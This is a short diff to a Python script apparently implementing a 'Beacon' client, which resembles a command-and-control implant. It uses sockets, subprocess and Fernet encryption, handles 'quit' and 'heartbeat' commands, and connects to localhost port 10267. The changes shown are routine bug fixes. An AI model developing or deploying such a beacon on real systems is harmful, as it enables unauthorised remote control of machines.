@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time,string
+import socket,subprocess,time
 from cryptography.fernet import Fernet
 
 class Beacon:
@@ -98,7 +98,7 @@ class Beacon:
                      elif split[0] == "quit":
                         self.terminate()
                      elif split[0] == "heartbeat":
-                        self.sock.send("ACTIVE")
+                        self.sock.send("ACTIVE".encode())
                      else:
                         self.sock.send("Unknown Error".encode())
                except socket.timeout:
@@ -121,4 +121,5 @@ def main():
    beacon = Beacon("127.0.0.1",10267)
    beacon.start()
 
-main()
+if __name__ == "__main__":
+   main()
